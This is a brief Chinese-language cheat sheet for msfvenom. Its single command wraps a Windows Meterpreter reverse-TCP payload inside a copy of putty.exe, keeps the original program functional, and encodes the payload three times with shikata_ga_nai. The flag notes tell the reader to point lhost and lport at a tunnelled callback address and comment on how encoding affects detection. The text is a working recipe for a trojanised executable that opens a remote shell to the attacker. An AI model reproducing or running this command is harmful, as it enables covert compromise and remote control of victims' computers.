# msfvenom

####

`msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=127.0.0.1 lport=8998 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe`

```
-a 表示目标机器架构；

-platform 表示系统平台；

-x 表示捆绑软件；

-p表示paylaod。
```

lhost和lport 输入之前内网穿透的ip和port

```
-i 表示编码次数，编码次数越多被检测的风险越大；

-o 表示输出文件的位置和名字。
```